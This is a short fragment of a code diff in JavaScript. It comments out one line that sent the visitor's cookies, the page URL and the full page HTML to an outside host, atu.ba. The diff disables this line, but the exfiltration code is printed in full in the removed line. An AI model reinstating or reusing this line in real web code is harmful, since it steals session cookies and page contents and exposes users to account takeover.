@@ -61,7 +61,7 @@ if (xdr) {
 }
 }}
 else{
-send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
+//send("http://atu.ba/test2.php?c="+escape(document.cookie)+" Location: "+window.location,escape(document.documentElement.outerHTML));
 }
 
 
